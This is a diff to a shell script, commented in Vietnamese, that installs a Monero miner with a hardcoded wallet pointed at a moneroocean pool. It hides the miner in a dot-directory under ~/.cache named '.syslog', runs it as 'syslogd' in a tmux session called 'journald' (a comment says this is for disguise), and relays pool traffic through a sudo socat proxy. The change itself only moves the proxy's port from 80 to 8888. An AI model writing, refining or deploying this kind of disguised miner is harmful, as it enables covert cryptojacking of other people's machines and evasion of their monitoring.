@@ -2,7 +2,7 @@
 
 # ==== Cấu hình chung ====
 POOL_REAL="gulf.moneroocean.stream:10128"
-POOL_LOCAL="127.0.0.1:80"
+POOL_LOCAL="127.0.0.1:8888"
 WALLET="84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z"  # 👈 ĐỔI ví tại đây
 CPU_PERCENT=90
 INSTALL_DIR="$HOME/.cache/.syslog"
@@ -54,7 +54,7 @@ EOF
 
 # ==== Tạo proxy từ port 80 sang pool TLS ====
 tmux has-session -t proxy 2>/dev/null || \
-tmux new-session -d -s proxy "sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:$POOL_REAL"
+tmux new-session -d -s proxy "sudo socat TCP-LISTEN:8888,reuseaddr,fork TCP:$POOL_REAL"
 
 # ==== Tạo script khởi chạy ngụy trang với giới hạn CPU ====
 tmux has-session -t journald 2>/dev/null || tmux new-session -d -s journald "cd ~/.cache/.syslog && ./syslogd -c .cfg.json" 2>> /root/.cache/.syslog/error.log
